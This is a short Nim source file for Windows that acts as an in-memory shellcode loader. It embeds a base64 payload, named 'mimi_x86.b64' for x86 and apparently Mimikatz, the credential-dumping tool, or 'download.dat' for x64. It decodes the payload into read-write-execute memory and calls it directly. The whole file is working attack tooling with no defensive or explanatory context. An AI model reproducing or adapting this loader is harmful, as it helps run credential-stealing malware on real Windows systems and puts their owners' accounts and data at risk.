import winim
import base64 
#import strenc

#when defined(windows):
when defined(i386):
  echo "[*] Running in x86 process"
  const b64 = staticRead"mimi_x86.b64"        
elif defined(amd64):
  echo "[*] Running in x64 process"
  #const b64 = staticRead"mimi_x64.b64"
  const b64 = staticRead"download.dat"

proc main() = 
  let tProcess = GetCurrentProcessId()

  var shellcode = decode(b64)
  
  echo "[*] Target Process: ", tProcess
  # Allocate memory
  let rPtr = VirtualAlloc(
      nil,
      cast[SIZE_T](shellcode.len),
      MEM_COMMIT,
      PAGE_EXECUTE_READ_WRITE
  )

  copyMem(rPtr,unsafeAddr shellcode[0],cast[SIZE_T](shellcode.len))
  let a = cast[proc(){.nimcall.}](rPtr)
  a()

when isMainModule:
  main()
